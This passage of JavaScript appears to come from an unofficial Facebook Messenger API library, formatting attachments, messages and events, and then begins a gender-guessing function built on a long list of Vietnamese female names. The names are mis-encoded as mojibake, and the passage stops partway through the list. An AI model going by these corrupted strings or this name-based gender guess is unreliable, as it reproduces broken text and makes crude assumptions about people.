caption: blob.label,\n                description: blob.label,\n\n                frameCount: blob.frame_count,\n                frameRate: blob.frame_rate,\n                framesPerRow: blob.frames_per_row,\n                framesPerCol: blob.frames_per_column,\n\n                stickerID: blob.id, // @Legacy\n                spriteURI: blob.sprite_image, // @Legacy\n                spriteURI2x: blob.sprite_image_2x // @Legacy\n            };\n        case \"MessageLocation\":\n            var urlAttach = blob.story_attachment.url;\n            var mediaAttach = blob.story_attachment.media;\n\n            var u = querystring.parse(url.parse(urlAttach).query).u;\n            var where1 = querystring.parse(url.parse(u).query).where1;\n            var address = where1.split(\", \");\n\n            var latitude;\n            var longitude;\n\n            try {\n                latitude = Number.parseFloat(address[0]);\n                longitude = Number.parseFloat(address[1]);\n            } catch (err) {\n                /* empty */\n\n            }\n\n            var imageUrl;\n            var width;\n            var height;\n\n            if (mediaAttach && mediaAttach.image) {\n                imageUrl = mediaAttach.image.uri;\n                width = mediaAttach.image.width;\n                height = mediaAttach.image.height;\n            }\n\n            return {\n                type: \"location\",\n                ID: blob.legacy_attachment_id,\n                latitude: latitude,\n                longitude: longitude,\n                image: imageUrl,\n                width: width,\n                height: height,\n                url: u || urlAttach,\n                address: where1,\n\n                facebookUrl: blob.story_attachment.url, // @Legacy\n                target: blob.story_attachment.target, // @Legacy\n                styleList: blob.story_attachment.style_list // @Legacy\n            };\n        case \"ExtensibleAttachment\":\n            return {\n                type: \"share\",\n                ID: blob.legacy_attachment_id,\n                url: blob.story_attachment.url,\n\n                title: blob.story_attachment.title_with_entities.text,\n                description: blob.story_attachment.description &&\n                    blob.story_attachment.description.text,\n                source: blob.story_attachment.source ? blob.story_attachment.source.text : null,\n\n                image: blob.story_attachment.media &&\n                    blob.story_attachment.media.image &&\n                    blob.story_attachment.media.image.uri,\n                width: blob.story_attachment.media &&\n                    blob.story_attachment.media.image &&\n                    blob.story_attachment.media.image.width,\n                height: blob.story_attachment.media &&\n                    blob.story_attachment.media.image &&\n                    blob.story_attachment.media.image.height,\n                playable: blob.story_attachment.media &&\n                    blob.story_attachment.media.is_playable,\n                duration: blob.story_attachment.media &&\n                    blob.story_attachment.media.playable_duration_in_ms,\n                playableUrl: blob.story_attachment.media == null ? null : blob.story_attachment.media.playable_url,\n\n                subattachments: blob.story_attachment.subattachments,\n                properties: blob.story_attachment.properties.reduce(function(/** @type {{ [x: string]: any; }} */obj, /** @type {{ key: string | number; value: { text: any; }; }} */cur) {\n                    obj[cur.key] = cur.value.text;\n                    return obj;\n                }, {}),\n\n                facebookUrl: blob.story_attachment.url, // @Legacy\n                target: blob.story_attachment.target, // @Legacy\n                styleList: blob.story_attachment.style_list // @Legacy\n            };\n        case \"MessageFile\":\n            return {\n                type: \"file\",\n                filename: blob.filename,\n                ID: blob.message_file_fbid,\n\n                url: blob.url,\n                isMalicious: blob.is_malicious,\n                contentType: blob.content_type,\n\n                name: blob.filename,\n                mimeType: \"\",\n                fileSize: -1\n            };\n        default:\n            throw new Error(\n                \"unrecognized attach_file of type \" +\n                type +\n                \"`\" +\n                JSON.stringify(attachment1, null, 4) +\n                \" attachment2: \" +\n                JSON.stringify(attachment2, null, 4) +\n                \"`\"\n            );\n    }\n}\n\n/**\n * @param {any[]} attachments\n * @param {{ [x: string]: string | number; }} attachmentIds\n * @param {{ [x: string]: any; }} attachmentMap\n * @param {any} shareMap\n */\n\nfunction formatAttachment(attachments, attachmentIds, attachmentMap, shareMap) {\n    attachmentMap = shareMap || attachmentMap;\n    return attachments ?\n        attachments.map(function(/** @type {any} */val, /** @type {string | number} */i) {\n            if (!attachmentMap ||\n                !attachmentIds ||\n                !attachmentMap[attachmentIds[i]]\n            ) {\n                return _formatAttachment(val);\n            }\n            return _formatAttachment(val, attachmentMap[attachmentIds[i]]);\n        }) : [];\n}\n\n/**\n * @param {{ delta: { messageMetadata: any; data: { prng: string; }; body: string; attachments: any; participants: any; }; }} m\n */\n\nfunction formatDeltaMessage(m) {\n    var md = m.messageMetadata;\n    var mdata =\n        m.data === undefined ? [] :\n        m.data.prng === undefined ? [] :\n        JSON.parse(m.data.prng);\n    var m_id = mdata.map((/** @type {{ i: any; }} */u) => u.i);\n    var m_offset = mdata.map((/** @type {{ o: any; }} */u) => u.o);\n    var m_length = mdata.map((/** @type {{ l: any; }} */u) => u.l);\n    var mentions = {};\n    var body = m.body || \"\";\n    var args = body == \"\" ? [] : body.trim().split(/\\s+/);\n    for (var i = 0; i < m_id.length; i++) mentions[m_id[i]] = m.body.substring(m_offset[i], m_offset[i] + m_length[i]);\n\n    return {\n        type: \"message\",\n        senderID: formatID(md.actorFbId.toString()),\n        threadID: formatID((md.threadKey.threadFbId || md.threadKey.otherUserFbId).toString()),\n        messageID: md.messageId,\n        args: args,\n        body: body,\n        attachments: (m.attachments || []).map((/** @type {any} */v) => _formatAttachment(v)),\n        mentions: mentions,\n        timestamp: md.timestamp,\n        isGroup: !!md.threadKey.threadFbId,\n        participantIDs: m.participants || []\n    };\n}\n\n/**\n * @param {string} id\n */\n\nfunction formatID(id) {\n    if (id != undefined && id != null) return id.replace(/(fb)?id[:.]/, \"\");\n    else return id;\n}\n\n/**\n * @param {{ message: any; type: string; realtime_viewer_fbid: { toString: () => any; }; }} m\n */\n\nfunction formatMessage(m) {\n    var originalMessage = m.message ? m.message : m;\n    var obj = {\n        type: \"message\",\n        senderName: originalMessage.sender_name,\n        senderID: formatID(originalMessage.sender_fbid.toString()),\n        participantNames: originalMessage.group_thread_info ? originalMessage.group_thread_info.participant_names : [originalMessage.sender_name.split(\" \")[0]],\n        participantIDs: originalMessage.group_thread_info ?\n            originalMessage.group_thread_info.participant_ids.map(function(/** @type {{ toString: () => any; }} */v) {\n                return formatID(v.toString());\n            }) : [formatID(originalMessage.sender_fbid)],\n        body: originalMessage.body || \"\",\n        threadID: formatID((originalMessage.thread_fbid || originalMessage.other_user_fbid).toString()),\n        threadName: originalMessage.group_thread_info ? originalMessage.group_thread_info.name : originalMessage.sender_name,\n        location: originalMessage.coordinates ? originalMessage.coordinates : null,\n        messageID: originalMessage.mid ? originalMessage.mid.toString() : originalMessage.message_id,\n        attachments: formatAttachment(\n            originalMessage.attachments,\n            originalMessage.attachmentIds,\n            originalMessage.attachment_map,\n            originalMessage.share_map\n        ),\n        timestamp: originalMessage.timestamp,\n        timestampAbsolute: originalMessage.timestamp_absolute,\n        timestampRelative: originalMessage.timestamp_relative,\n        timestampDatetime: originalMessage.timestamp_datetime,\n        tags: originalMessage.tags,\n        reactions: originalMessage.reactions ? originalMessage.reactions : [],\n        isUnread: originalMessage.is_unread \n    };\n\n    if (m.type === \"pages_messaging\") obj.pageID = m.realtime_viewer_fbid.toString();\n    obj.isGroup = obj.participantIDs.length > 2;\n\n    return obj;\n}\n\n/**\n * @param {{ message: any; }} m\n */\n\nfunction formatEvent(m) {\n    var originalMessage = m.message ? m.message : m;\n    var logMessageType = originalMessage.log_message_type;\n    var logMessageData;\n    if (logMessageType === \"log:generic-admin-text\") {\n        logMessageData = originalMessage.log_message_data.untypedData;\n        logMessageType = getAdminTextMessageType(originalMessage.log_message_data.message_type);\n    } else logMessageData = originalMessage.log_message_data;\n\n    return Object.assign(formatMessage(originalMessage), {\n        type: \"event\",\n        logMessageType: logMessageType,\n        logMessageData: logMessageData,\n        logMessageBody: originalMessage.log_message_body\n    });\n}\n\n/**\n * @param {{ action_type: any; }} m\n */\n\nfunction formatHistoryMessage(m) {\n    switch (m.action_type) {\n        case \"ma-type:log-message\":\n            return formatEvent(m);\n        default:\n            return formatMessage(m);\n    }\n}\n\n// Get a more readable message type for AdminTextMessages\n/**\n * @param {{ type: any; }} m\n */\n\nfunction getAdminTextMessageType(m) {\n    switch (m.type) {\n        case \"joinable_group_link_mode_change\":\n            return \"log:link-status\";\n        case \"magic_words\":\n            return \"log:magic-words\";\n        case \"change_thread_theme\":\n            return \"log:thread-color\";\n        case \"change_thread_icon\":\n            return \"log:thread-icon\";\n        case \"change_thread_nickname\":\n            return \"log:user-nickname\";\n        case \"change_thread_admins\":\n            return \"log:thread-admins\";\n        case \"group_poll\":\n            return \"log:thread-poll\";\n        case \"change_thread_approval_mode\":\n            return \"log:thread-approval-mode\";\n        case \"messenger_call_log\":\n        case \"participant_joined_group_call\":\n            return \"log:thread-call\";\n        case \"pin_messages_v2\":\n            return \"log:thread-pinned\";\n    }\n}\n\n/**\n * @param {string} name\n */\n\nfunction getGenderByPhysicalMethod(name) {\n  const female_name = [\n    \"Ph∆∞∆°ng Chi\",\n    \"An B√¨nh\",\n    \"An Di\",\n    \"An H·∫°\",\n    \"An H·∫±ng\",\n    \"An Kh√™\",\n    \"An Nhi√™n\",\n    \"An Nh√†n\",\n    \"Anh Chi\",\n    \"Anh H∆∞∆°ng\",\n    \"Anh Mai\",\n    \"Anh Ph∆∞∆°ng\",\n    \"Anh Thi\",\n    \"Anh Thy\",\n    \"Anh Th∆°\",\n    \"Anh Th∆∞\",\n    \"Anh Th·∫£o\",\n    \"Anh V≈©\",\n    \"Anh √ê√†o\",\n    \"Ban Mai\",\n    \"B√¨nh Minh\",\n    \"B√¨nh Y√™n\",\n    \"B√≠ch Chi√™u\",\n    \"B√≠ch Ch√¢u\",\n    \"B√≠ch Duy√™n\",\n    \"B√≠ch Hi·ªÅn\",\n    \"B√≠ch Hu·ªá\",\n    \"B√≠ch H√†\",\n    \"B√≠ch H·∫°nh\",\n    \"B√≠ch H·∫£i\",\n    \"B√≠ch H·∫£o\",\n    \"B√≠ch H·∫≠u\",\n    \"B√≠ch H·∫±ng\",\n    \"B√≠ch H·ªìng\",\n    \"B√≠ch H·ª£p\",\n    \"B√≠ch Lam\",\n    \"B√≠ch Li√™n\",\n    \"B√≠ch Loan\",\n    \"B√≠ch Nga\",\n    \"B√≠ch Ng√†\",\n    \"B√≠ch Ng√¢n\",\n    \"B√≠ch Ng·ªçc\",\n    \"B√≠ch Nh∆∞\",\n    \"B√≠ch Ph∆∞·ª£ng\",\n    \"B√≠ch Quy√™n\",\n    \"B√≠ch Qu√¢n\",\n    \"B√≠ch San\",\n    \"B√≠ch Thoa\",\n    \"B√≠ch Thu\",\n    \"B√≠ch Th·∫£o\",\n    \"B√≠ch Th·ªßy\",\n    \"B√≠ch Trang\",\n    \"B√≠ch Tr√¢m\",\n    \"B√≠ch Ty\",\n    \"B√≠ch V√¢n\",\n    \"B√≠ch √êi·ªáp\",\n    \"B√≠ch √ê√†o\",\n    \"BƒÉng BƒÉng\",\n    \"BƒÉng T√¢m\",\n    \"B·∫°ch C√∫c\",\n    \"B·∫°ch Hoa\",\n    \"B·∫°ch Kim\",\n    \"B·∫°ch Li√™n\",\n    \"B·∫°ch Loan\",\n    \"B·∫°ch Mai\",\n    \"B·∫°ch Qu·ª≥nh\",\n    \"B·∫°ch Tr√†\",\n    \"B·∫°ch Tuy·∫øt\",\n    \"B·∫°ch V√¢n\",\n    \"B·∫°ch Y·∫øn\",\n    \"B·∫£o Anh\",\n    \"B·∫£o B√¨nh\",\n    \"B·∫£o Ch√¢u\",\n    \"B·∫£o Hu·ªá\",\n    \"B·∫£o H√†\",\n    \"B·∫£o H√¢n\",\n    \"B·∫£o Lan\",\n    \"B·∫£o L·ªÖ\",\n    \"B·∫£o Ng·ªçc\",\n    \"B·∫£o Ph∆∞∆°ng\",\n    \"B·∫£o Quy√™n\",\n    \"B·∫£o Qu·ª≥nh\",\n    \"B·∫£o Thoa\",\n    \"B·∫£o Th√∫y\",\n    \"B·∫£o Ti√™n\",\n    \"B·∫£o Tr√¢m\",\n    \"B·∫£o Tr√¢n\",\n    \"B·∫£o Tr√∫c\",\n    \"B·∫£o Uy√™n\",\n    \"B·∫£o Vy\",\n    \"B·∫£o V√¢n\",\n    \"B·ªôi Linh\",\n    \"Cam Th·∫£o\",\n    \"Chi Lan\",\n    \"Chi Mai\",\n    \"Chi√™u D∆∞∆°ng\",\n    \"C√°t C√°t\",\n    \"C√°t Linh\",\n    \"C√°t Ly\",\n    \"C√°t Ti√™n\",\n    \"C√°t T∆∞·ªùng\",\n    \"C·∫©m Hi·ªÅn\",\n    \"C·∫©m H∆∞·ªùng\",\n    \"C·∫©m H·∫°nh\",\n    \"C·∫©m Linh\",\n    \"C·∫©m Li√™n\",\n    \"C·∫©m Ly\",\n    \"C·∫©m Nhi\",\n    \"C·∫©m Nhung\",\n    \"C·∫©m Th√∫y\",\n    \"C·∫©m T√∫\",\n    \"C·∫©m V√¢n\",\n    \"C·∫©m Y·∫øn\",\n    \"Di Nhi√™n\",\n    \"Di√™n V·ªπ\",\n    \"Di·ªÖm Chi\",\n    \"Di·ªÖm Ch√¢u\",\n    \"Di·ªÖm H∆∞∆°ng\",\n    \"Di·ªÖm H·∫°nh\",\n    \"Di·ªÖm H·∫±ng\",\n    \"Di·ªÖm Khu√™\",\n    \"Di·ªÖm Ki·ªÅu\",\n    \"Di·ªÖm Li√™n\",\n    \"Di·ªÖm L·ªôc\",\n    \"Di·ªÖm My\",\n    \"Di·ªÖm Ph√∫c\",\n    \"Di·ªÖm Ph∆∞∆°ng\",\n    \"Di·ªÖm Ph∆∞·ªõc\",\n    \"Di·ªÖm Ph∆∞·ª£ng\",\n    \"Di·ªÖm Quy√™n\",\n    \"Di·ªÖm Qu·ª≥nh\",\n    \"Di·ªÖm Th√∫y\",\n    \"Di·ªÖm Th∆∞\",\n    \"Di·ªÖm Th·∫£o\",\n    \"Di·ªÖm Trang\",\n    \"Di·ªÖm Trinh\",\n    \"Di·ªÖm Uy√™n\",\n    \"Di·ªáp Anh\",\n    \"Di·ªáp Vy\",\n    \"Di·ªáu Anh\",\n    \"Di·ªáu Hi·ªÅn\",\n    \"Di·ªáu Hoa\",\n    \"Di·ªáu Huy·ªÅn\",\n    \"Di·ªáu H∆∞∆°ng\",\n    \"Di·ªáu H·∫°nh\",\n    \"Di·ªáu H·∫±ng\",\n    \"Di·ªáu H·ªìng\",\n    \"Di·ªáu Lan\",\n    \"Di·ªáu Linh\",\n    \"Di·ªáu Loan\",\n    \"Di·ªáu Nga\",\n    \"Di·ªáu Ng√†\",\n    \"Di·ªáu Ng·ªçc\",\n    \"Di·ªáu N∆∞∆°ng\",\n    \"Di·ªáu Thi·ªán\",\n    \"Di·ªáu Th√∫y\",\n    \"Di·ªáu V√¢n\",\n    \"Di·ªáu √Åi\",\n    \"Duy H·∫°nh\",\n    \"Duy M·ªπ\",\n    \"Duy Uy√™n\",\n    \"Duy√™n H·ªìng\",\n    \"Duy√™n My\",\n    \"Duy√™n M·ªπ\",\n    \"Duy√™n N∆∞∆°ng\",\n    \"D√£ Lan\",\n    \"D√£ L√¢m\",\n    \"D√£ Th·∫£o\",\n    \"D·∫° H∆∞∆°ng\",\n    \"D·∫° Lan\",\n    \"D·∫° Nguy·ªát\",\n    \"D·∫° Thi\",\n    \"D·∫° Th·∫£o\",\n    \"D·∫° Y·∫øn\",\n    \"Gia H√¢n\",\n    \"Gia Khanh\",\n    \"Gia Linh\",\n    \"Gia Nhi\",\n    \"Gia Qu·ª≥nh\",\n    \"Giang Thanh\",\n    \"Giang Thi√™n\",\n    \"Giao H∆∞·ªüng\",\n    \"Giao Ki·ªÅu\",\n    \"Giao Linh\",\n    \"Gi√°ng Ng·ªçc\",\n    \"Gi√°ng Ti√™n\",\n    \"Gi√°ng Uy√™n\",\n    \"Hi·∫øu Giang\",\n    \"Hi·∫øu H·∫°nh\",\n    \"Hi·∫øu Khanh\",\n    \"Hi·∫øu Minh\",\n    \"Hi·ªÅn Chung\",\n    \"Hi·ªÅn H√≤a\",\n    \"Hi·ªÅn Mai\",\n    \"Hi·ªÅn Nhi\",\n    \"Hi·ªÅn N∆∞∆°ng\",\n    \"Hi·ªÅn Th·ª•c\",\n    \"Hi·ªÉu Lam\",\n    \"Hi·ªÉu V√¢n\",\n    \"Hoa Li√™n\",\n    \"Hoa L√Ω\",\n    \"Hoa Thi√™n\",\n    \"Hoa Ti√™n\",\n    \"Hoa Tranh\",\n    \"Ho√†i An\",\n    \"Ho√†i Giang\",\n    \"Ho√†i H∆∞∆°ng\",\n    \"Ho√†i Ph∆∞∆°ng\",\n    \"Ho√†i Th∆∞∆°ng\",\n    \"Ho√†i Trang\",\n    \"Ho√†i V·ªπ\",\n    \"Ho√†n Ch√¢u\",\n    \"Ho√†n Vi\",\n    \"Ho√†ng C√∫c\",\n    \"Ho√†ng H√†\",\n    \"Ho√†ng Kim\",\n    \"Ho√†ng Lan\",\n    \"Ho√†ng Mai\",\n    \"Ho√†ng Mi√™n\",\n    \"Ho√†ng Nguy√™n\",\n    \"Ho√†ng Oanh\",\n    \"Ho√†ng Sa\",\n    \"Ho√†ng Th∆∞\",\n    \"Ho√†ng Xu√¢n\",\n    \"Ho√†ng Y·∫øn\",\n    \"Ho·∫° Mi\",\n    \"Huy·ªÅn Anh\",\n    \"Huy·ªÅn Di·ªáu\",\n    \"Huy·ªÅn Linh\",\n    \"Huy·ªÅn Ng·ªçc\",\n    \"Huy·ªÅn Nhi\",\n    \"Huy·ªÅn Tho·∫°i\",\n    \"Huy·ªÅn Th∆∞\",\n    \"Huy·ªÅn Trang\",\n    \"Huy·ªÅn Tr√¢m\",\n    \"Huy·ªÅn Tr√¢n\",\n    \"Hu·ªá An\",\n    \"Hu·ªá H∆∞∆°ng\",\n    \"Hu·ªá H·ªìng\",\n    \"Hu·ªá Lan\",\n    \"Hu·ªá Linh\",\n    \"Hu·ªá L√¢m\",\n    \"Hu·ªá My\",\n    \"Hu·ªá Ph∆∞∆°ng\",\n    \"Hu·ªá Th∆∞∆°ng\",\n    \"Hu·ªá √Çn\",\n    \"Hu·ª≥nh Anh\",\n    \"H√† Giang\",\n    \"H√† Li√™n\",\n    \"H√† Mi\",\n    \"H√† My\",\n    \"H√† Nhi\",\n    \"H√† Ph∆∞∆°ng\",\n    \"H√† Thanh\",\n    \"H√† Ti√™n\",\n    \"H√†m Duy√™n\",\n    \"H√†m Nghi\",\n    \"H√†m Th∆°\",\n    \"H√†m √ù\",\n    \"H∆∞∆°ng Chi\",\n    \"H∆∞∆°ng Giang\",\n    \"H∆∞∆°ng Lan\",\n    \"H∆∞∆°ng Li√™n\",\n    \"H∆∞∆°ng Ly\",\n    \"H∆∞∆°ng L√¢m\",\n    \"H∆∞∆°ng Mai\",\n    \"H∆∞∆°ng Nhi\",\n    \"H∆∞∆°ng Thu\",\n    \"H∆∞∆°ng Th·∫£o\",\n    \"H∆∞∆°ng Th·ªßy\",\n    \"H∆∞∆°ng Ti√™n\",\n    \"H∆∞∆°ng Trang\",\n    \"H∆∞∆°ng Tr√†\",\n    \"H∆∞∆°ng Xu√¢n\",\n    \"H∆∞·ªõng D∆∞∆°ng\",\n    \"H·∫° BƒÉng\",\n    \"H·∫° Giang\",\n    \"H·∫° Ph∆∞∆°ng\",\n    \"H·∫° Ti√™n\",\n    \"H·∫° Uy√™n\",\n    \"H·∫° Vy\",\n    \"H·∫°c C√∫c\",\n    \"H·∫°nh Chi\",\n    \"H·∫°nh Dung\",\n    \"H·∫°nh Linh\",\n    \"H·∫°nh My\",\n    \"H·∫°nh Nga\",\n    \"H·∫°nh Nh∆°n\",\n    \"H·∫°nh Ph∆∞∆°ng\",\n    \"H·∫°nh San\",\n    \"H·∫°nh Th·∫£o\",\n    \"H·∫°nh Trang\",\n    \"H·∫°nh Vi\",\n    \"H·∫£i Anh\",\n    \"H·∫£i Ch√¢u\",\n    \"H·∫£i Duy√™n\",\n    \"H·∫£i D∆∞∆°ng\",\n    \"H·∫£i Mi√™n\",\n    \"H·∫£i My\",\n    \"H·∫£i M·ªπ\",\n    \"H·∫£i Ng√¢n\",\n    \"H·∫£i Nhi\",\n    \"H·∫£i Ph∆∞∆°ng\",\n    \"H·∫£i Ph∆∞·ª£ng\",\n    \"H·∫£i San\",\n    \"H·∫£i Sinh\",\n    \"H·∫£i Thanh\",\n    \"H·∫£i Th·∫£o\",\n    \"H·∫£i Th·ª•y\",\n    \"H·∫£i Uy√™n\",\n    \"H·∫£i Vy\",\n    \"H·∫£i V√¢n\",\n    \"H·∫£i Y·∫øn\",\n    \"H·∫£i √Çn\",\n    \"H·∫£i √ê∆∞·ªùng\",\n    \"H·∫£o Nhi\",\n    \"H·∫±ng Anh\",\n    \"H·∫±ng Nga\",\n    \"H·ªça Mi\",\n    \"H·ªì Di·ªáp\",\n    \"H·ªìng Anh\",\n    \"H·ªìng B·∫°ch Th·∫£o\",\n    \"H·ªìng Ch√¢u\",\n    \"H·ªìng Di·ªÖm\",\n    \"H·ªìng Giang\",\n    \"H·ªìng Hoa\",\n    \"H·ªìng H√†\",\n    \"H·ªìng H·∫°nh\",\n    \"H·ªìng Khanh\",\n    \"H·ªìng Khu√™\",\n    \"H·ªìng Kh√¥i\",\n    \"H·ªìng Linh\",\n    \"H·ªìng Li√™n\",\n    \"H·ªìng L√¢m\",\n    \"H·ªìng Mai\",\n    \"H·ªìng Nga\",\n    \"H·ªìng Ng√¢n\",\n    \"H·ªìng Ng·ªçc\",\n    \"H·ªìng Nhung\",\n    \"H·ªìng Nh∆∞\",\n    \"H·ªìng Nh·∫°n\",\n    \"H·ªìng Oanh\",\n    \"H·ªìng Ph√∫c\",\n    \"H·ªìng Ph∆∞∆°ng\",\n    \"H·ªìng Qu·∫ø\",\n    \"H·ªìng Thu\",\n    \"H·ªìng Th√∫y\",\n    \"H·ªìng Th∆∞\",\n    \"H·ªìng Th·∫£o\",\n    \"H·ªìng Th·∫Øm\",\n    \"H·ªìng Th·ªßy\",\n    \"H·ªìng Tr√∫c\",\n    \"H·ªìng T√¢m\",\n    \"H·ªìng V√¢n\",\n    \"H·ªìng Xu√¢n\",\n    \"H·ªìng √êi·ªáp\",\n    \"H·ªìng √ê√†o\",\n    \"H·ªìng ƒêƒÉng\",\n    \"Khi·∫øt Linh\",\n    \"Khi·∫øt T√¢m\",\n    \"Khu√™ Trung\",\n    \"Kh√°nh Chi\",\n    \"Kh√°nh Giang\",\n    \"Kh√°nh Giao\",\n    \"Kh√°nh Huy·ªÅn\",\n    \"Kh√°nh H√†\",\n    \"Kh√°nh H·∫±ng\",\n    \"Kh√°nh Linh\",\n    \"Kh√°nh Ly\",\n    \"Kh√°nh Mai\",\n    \"Kh√°nh My\",\n    \"Kh√°nh Ng√¢n\",\n    \"Kh√°nh Ng·ªçc\",\n    \"Kh√°nh Quy√™n\",\n    \"Kh√°nh Qu·ª≥nh\",\n    \"Kh√°nh Th·ªßy\",\n    \"Kh√°nh Trang\",\n    \"Kh√°nh Vi\",\n    \"Kh√°nh Vy\",\n    \"Kh√°nh V√¢n\",\n    \"Kh√∫c Lan\",\n    \"Kh·∫£ Khanh\",\n    \"Kh·∫£ T√∫\",\n    \"Kh·∫£ √Åi\",\n    \"Kh·∫£i Ca\",\n    \"Kh·∫£i H√†\",\n    \"Kh·∫£i T√¢m\",\n    \"Kim Anh\",\n    \"Kim Chi\",\n    \"Kim C∆∞∆°ng\",\n    \"Kim Dung\",\n    \"Kim Duy√™n\",\n    \"Kim Hoa\",\n    \"Kim H∆∞∆°ng\",\n    \"Kim Khanh\",\n    \"Kim Khuy√™n\",\n    \"Kim Kh√°nh\",\n    \"Kim Lan\",\n    \"Kim Li√™n\",\n    \"Kim Loan\",\n    \"Kim Ly\",\n    \"Kim Mai\",\n    \"Kim Ng√¢n\",\n    \"Kim Ng·ªçc\",\n    \"Kim Oanh\",\n    \"Kim Ph∆∞·ª£ng\",\n    \"Kim Quy√™n\",\n    \"Kim Sa\",\n    \"Kim Thanh\",\n    \"Kim Thoa\",\n    \"Kim Thu\",\n    \"Kim Thy\",\n    \"Kim Th√¥ng\",\n    \"Kim Th∆∞\",\n    \"Kim Th·∫£o\",\n    \"Kim Th·ªßy\",\n    \"Kim Trang\",\n    \"Kim Tuy·∫øn\",\n    \"Kim Tuy·∫øt\",\n    \"Kim Tuy·ªÅn\",\n    \"Kim Xuy·∫øn\",\n    \"Kim Xu√¢n\",\n    \"Kim Y·∫øn\",\n    \"Kim √Ånh\",\n    \"Kim ƒêan\",\n    \"Ki·∫øt H·ªìng\",\n    \"Ki·∫øt Trinh\",\n    \"Ki·ªÅu Anh\",\n    \"Ki·ªÅu Di·ªÖm\",\n    \"Ki·ªÅu Dung\",\n    \"Ki·ªÅu Giang\",\n    \"Ki·ªÅu Hoa\",\n    \"Ki·ªÅu H·∫°nh\",\n    \"Ki·ªÅu Khanh\",\n    \"Ki·ªÅu Loan\",\n    \"Ki·ªÅu Mai\",\n    \"Ki·ªÅu Minh\",\n    \"Ki·ªÅu M·ªπ\",\n    \"Ki·ªÅu Nga\",\n    \"Ki·ªÅu Nguy·ªát\",\n    \"Ki·ªÅu N∆∞∆°ng\",\n    \"Ki·ªÅu Thu\",\n    \"Ki·ªÅu Trang\",\n    \"Ki·ªÅu Trinh\",\n    \"K·ª≥ Anh\",\n    \"K·ª≥ Di·ªáu\",\n    \"K·ª≥ Duy√™n\",\n    \"Lam Giang\",\n    \"Lam H√†\",\n    \"Lam Kh√™\",\n    \"Lam Ng·ªçc\",\n    \"Lam Tuy·ªÅn\",\n    \"Lan Anh\",\n    \"Lan Chi\",\n    \"Lan H∆∞∆°ng\",\n    \"Lan Khu√™\",\n    \"Lan Ng·ªçc\",\n    \"Lan Nhi\",\n    \"Lan Ph∆∞∆°ng\",\n    \"Lan Th∆∞∆°ng\",\n    \"Lan Tr√∫c\",\n    \"Lan Vy\",\n    \"Linh Chi\",\n    \"Linh Ch√¢u\",\n    \"Linh Duy√™n\",\n    \"Linh Giang\",\n    \"Linh H√†\",\n    \"Linh Lan\",\n    \"Linh Nhi\",\n    \"Linh Ph∆∞∆°ng\",\n    \"Linh Ph∆∞·ª£ng\",\n    \"Linh San\",\n    \"Linh Trang\",\n    \"Linh √êan\",\n    \"Li√™n Chi\",\n    \"Li√™n Hoa\",\n    \"Li√™n H∆∞∆°ng\",\n    \"Li√™n Nh∆∞\",\n    \"Li√™n Ph∆∞∆°ng\",\n    \"Li√™n Tr√¢n\",\n    \"Li·ªÖu Oanh\",\n    \"Loan Ch√¢u\",\n    \"Ly Ch√¢u\",\n    \"L√¢m Nhi\",\n    \"L√¢m Oanh\",\n    \"L√¢m Tuy·ªÅn\",\n    \"L√¢m Uy√™n\",\n    \"L√™ Qu·ª≥nh\",\n    \"L∆∞u Ly\",\n    \"L·ªá BƒÉng\",\n    \"L·ªá Chi\",\n    \"L·ªá Giang\",\n    \"L·ªá Hoa\",\n    \"L·ªá Huy·ªÅn\",\n    \"L·ªá Khanh\",\n    \"L·ªá Nga\",\n    \"L·ªá Nhi\",\n    \"L·ªá Quy√™n\",\n    \"L·ªá Qu√¢n\",\n    \"L·ªá Thanh\",\n    \"L·ªá Thu\",\n    \"L·ªá Th·ªßy\",\n    \"L·ªôc Uy√™n\",\n    \"L·ªôc Uy·ªÉn\",\n    \"L·ª•c B√¨nh\",\n    \"Mai Anh\",\n    \"Mai Chi\",\n    \"Mai Ch√¢u\",\n    \"Mai Hi·ªÅn\",\n    \"Mai H√†\",\n    \"Mai H∆∞∆°ng\",\n    \"Mai H·∫°\",\n    \"Mai Khanh\",\n    \"Mai Kh√¥i\",\n    \"Mai Lan\",\n    \"Mai Linh\",\n    \"Mai Li√™n\",\n    \"Mai Loan\",\n    \"Mai Ly\",\n    \"Mai Nhi\",\n    \"Mai Ph∆∞∆°ng\",\n    \"Mai Quy√™n\",\n    \"Mai Thanh\",\n    \"Mai Thu\",\n    \"Mai Thy\",\n    \"Mai Th·∫£o\",\n    \"Mai Trinh\",\n    \"Mai T√¢m\",\n    \"Mai Vy\",\n    \"Minh An\",\n    \"Minh Ch√¢u\",\n    \"Minh Duy√™n\",\n    \"Minh Hi·ªÅn\",\n    \"Minh Huy·ªÅn\",\n    \"Minh Hu·ªá\",\n    \"Minh H√†\",\n    \"Minh H∆∞∆°ng\",\n    \"Minh H·∫°nh\",\n    \"Minh H·∫±ng\",\n    \"Minh H·ªìng\",\n    \"Minh Khai\",\n    \"Minh Khu√™\",\n    \"Minh Loan\",\n    \"Minh Minh\",\n    \"Minh Nguy·ªát\",\n    \"Minh Ng·ªçc\",\n    \"Minh Nhi\",\n    \"Minh Nh∆∞\",\n    \"Minh Ph∆∞∆°ng\",\n    \"Minh Ph∆∞·ª£ng\",\n    \"Minh Thu\",\n    \"Minh Th√∫y\",\n    \"Minh Th∆∞\",\n    \"Minh Th∆∞∆°ng\",\n    \"Minh Th·∫£o\",\n    \"Minh Th·ªßy\",\n    \"Minh Trang\",\n    \"Minh Tuy·∫øt\",\n    \"Minh Tu·ªá\",\n    \"Minh T√¢m\",\n    \"Minh Uy√™n\",\n    \"Minh Vy\",\n    \"Minh Xu√¢n\",\n    \"Minh Y·∫øn\",\n    \"Minh ƒêan\",\n    \"M·∫≠u Xu√¢n\",\n    \"M·ªôc Mi√™n\",\n    \"M·ªông Hoa\",\n    \"M·ªông H∆∞∆°ng\",\n    \"M·ªông H·∫±ng\",\n    \"M·ªông Lan\",\n    \"M·ªông Li·ªÖu\",\n    \"M·ªông Nguy·ªát\",\n    \"M·ªông Nhi\",\n    \"M·ªông Qu·ª≥nh\",\n    \"M·ªông Thi\",\n    \"M·ªông Thu\",\n    \"M·ªông Tuy·ªÅn\",\n    \"M·ªông Vi\",\n    \"M·ªông Vy\",\n    \"M·ªông V√¢n\",\n    \"M·ªông √êi·ªáp\",\n    \"M·ªπ Anh\",\n    \"M·ªπ Di·ªÖm\",\n    \"M·ªπ Dung\",\n    \"M·ªπ Duy√™n\",\n    \"M·ªπ Hi·ªáp\",\n    \"M·ªπ Ho√†n\",\n    \"M·ªπ Huy·ªÅn\",\n    \"M·ªπ Hu·ªá\",\n    \"M·ªπ H∆∞·ªùng\",\n    \"M·ªπ 